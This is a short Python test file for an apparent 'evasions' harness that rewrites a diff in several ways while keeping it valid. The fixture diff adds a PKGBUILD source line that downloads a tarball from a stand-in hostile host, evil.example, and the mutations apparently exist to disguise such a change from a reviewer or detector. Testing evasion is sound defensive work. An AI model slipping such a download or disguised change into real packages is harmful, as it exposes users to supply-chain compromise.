"""Mutations preserve meaning and produce valid diffs."""

from __future__ import annotations

from harness.evasions import MUTATIONS, apply, mutations

DIFF = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,5 @@\n pkgname=p\n pkgver=1\n"
        "+source=(\"https://evil.example/x.tar.gz\")\n+build() {\n  }\n")


def test_every_mutation_changes_the_diff():
    out = mutations(DIFF)
    assert set(out) == set(MUTATIONS)
    for name, text in out.items():
        assert text != DIFF, name


def test_the_hunk_count_matches_the_added_lines():
    for name, text in mutations(DIFF).items():
        body = [line for line in text.splitlines() if line.startswith("+")
                and not line.startswith("+++")]
        header = next(line for line in text.splitlines() if line.startswith("@@"))
        declared = int(header.split("+1,")[1].split(" ")[0])
        context = sum(1 for line in text.splitlines() if line.startswith(" "))
        assert declared == len(body) + context, (name, declared, len(body))


def test_an_unknown_mutation_is_a_no_op():
    assert apply(DIFF, "nope") == DIFF
